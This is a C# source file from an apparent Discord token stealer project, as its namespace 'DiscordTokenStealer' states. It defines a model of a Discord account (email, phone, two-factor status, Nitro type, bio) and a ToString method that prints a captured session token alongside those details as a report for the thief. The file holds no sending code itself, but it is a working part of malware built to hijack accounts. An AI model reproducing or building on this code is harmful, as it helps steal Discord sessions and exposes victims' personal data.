using System.Text.Json.Serialization;
using Cysharp.Text;

namespace DiscordTokenStealer.Discord;

public class DiscordUser
{
    public DiscordUser(string? phoneNumber, string? aboutMe, string username, string discriminator, string id,
        string locale, bool twoFactor, string email, bool emailVerified, int premiumType)
    {
        PhoneNumber = phoneNumber;
        AboutMe = aboutMe;
        Username = username;
        Discriminator = discriminator;
        Id = id;
        Locale = locale;
        TwoFactor = twoFactor;
        Email = email;
        EmailVerified = emailVerified;
        PremiumType = premiumType;
    }

    [JsonIgnore] public string? Token { get; set; }
    [JsonPropertyName("username")] public string Username { get; }
    [JsonPropertyName("discriminator")] public string Discriminator { get; }
    [JsonPropertyName("id")] public string Id { get; }
    [JsonPropertyName("locale")] public string Locale { get; }
    [JsonPropertyName("mfa_enabled")] public bool TwoFactor { get; }
    [JsonPropertyName("email")] public string Email { get; }
    [JsonPropertyName("verified")] public bool EmailVerified { get; }
    [JsonPropertyName("premium_type")] public int PremiumType { get; }
    [JsonPropertyName("phone")] public string? PhoneNumber { get; }
    [JsonPropertyName("bio")] public string? AboutMe { get; }

    public override string ToString()
    {
        using var sb = ZString.CreateUtf8StringBuilder();
        
        if (!string.IsNullOrEmpty(Token)) 
            sb.AppendLine($"\t{Token}");
        
        sb.AppendLine("\tSummary:");
        sb.AppendLine($"\t\tUser: {Username}#{Discriminator} ({Id})");
        sb.AppendLine($"\t\tEmail: {Email}");
        
        if (!string.IsNullOrEmpty(PhoneNumber)) 
            sb.AppendLine($"\t\tPhone: {PhoneNumber}");
        
        sb.AppendLine($"\t\tLocale: {Locale}");
        sb.AppendLine($"\t\tVerified: {EmailVerified}");
        sb.AppendLine($"\t\tTwo-Factor: {TwoFactor}");
        
        if (!string.IsNullOrEmpty(AboutMe)) 
            sb.AppendLine($"\t\tAbout Me: {AboutMe}");
        
        sb.AppendLine($"\t\tNitro-Type: {(DiscordNitroType) PremiumType}");
        return sb.ToString();
    }
}